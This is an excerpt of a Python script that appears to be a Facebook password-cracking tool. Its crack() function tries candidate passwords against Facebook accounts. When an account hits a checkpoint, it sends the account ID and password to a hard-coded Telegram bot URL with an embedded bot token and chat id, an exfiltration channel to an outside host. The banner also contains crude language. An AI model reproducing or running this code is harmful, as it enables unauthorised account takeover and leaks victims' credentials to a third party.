...
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100093235072597&mibextid=ZbWKwL')
	back()
def linex():
	print('\033[1;37m----------------------------------------------')
...
\033[1;37m----------------------------------------------
 AUTHOR     : Ronish stha
 GITHUB     : Ronish x Fuxker
 FACEBOOK   : Ronish Shrestha
 VERSION    :\u001b[32m 0.4.4\033[1;37m
 STATUS     : DISABLED
\033[1;37m----------------------------------------------
 FUCKER BAAP RONISH INXID3
\033[1;37m----------------------------------------------""")
...
def cpsw():
	linex()
	oldpsw = input(" [\u001b[36m•\033[1;37m] ENTER YOUR OLD PASSWORD : " )
	if oldpsw == upass:
		linex()
		upsw = input(" [\u001b[36m•\033[1;37m] ENTER A NEW PASSWORD : " )
		open('.password.txt','w').write(upsw)
		print('\033[1;37m----------------------------------------------')
		animation(' >> YOUR PASSWORD HAS BEEN CHANGED ')
		time.sleep(1)
...
def name(): 
	os.system('clear')
	banner()
	print(" [\u001b[36m>\033[1;37m] USE YOUR REAL NAME OTHERWISE DISAPPROVED" )
	linex()
				...
				if 'How do you want to log into Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Success!' in str(response6):
							...
							linex()
							animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN DONE RERUN');exit()
			except Exception as e:
				linex()
...
def passwrd():
	...
	print(' [\u001b[36m•\033[1;37m] \u001b[32mOK\033[1;37m : %s '%(ok))
	print(' [\u001b[36m•\033[1;37m] \u001b[33mCP\033[1;37m : %s '%(cp))
	linex()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[RONISH-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get("https://api.telegram.org/bot6411867531:AAFkbMbnpFBrZHDMqQqi4KIW_tLJ8lhEGBs/sendMessage?chat_id=@nikhildahal45&text="+uname+"[ "+idf+' | '+pw+ " ]")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
